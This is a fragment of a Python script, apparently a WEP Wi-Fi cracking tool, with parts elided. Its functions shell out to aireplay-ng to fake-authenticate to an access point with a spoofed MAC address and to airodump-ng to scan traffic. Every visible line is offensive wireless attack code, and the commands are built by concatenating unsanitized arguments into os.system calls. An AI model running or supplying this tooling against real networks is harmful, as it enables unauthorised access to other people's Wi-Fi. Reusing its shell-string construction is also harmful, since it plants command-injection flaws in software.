...
def cracky2(MAC, Channel, BSSID, SSID):
	fake_auth_advanced = "sudo aireplay-ng -1 6000 -o 1 -q 10 -e" + " " + SSID + " -a " + BSSID + " -h " + MAC + " " + mon_interface

	# Fake authenticates to the wireless access point using the spoofed MAC address.
	os.system("sudo aireplay-ng -1 0 -a " + BSSID + " -h " + MAC + " " + mon_interface)
...
def crackWEP(MAC, Channel, BSSID, SSID):
	...
	# Scan
	os.system("sudo airodump-ng " + mon_interface)
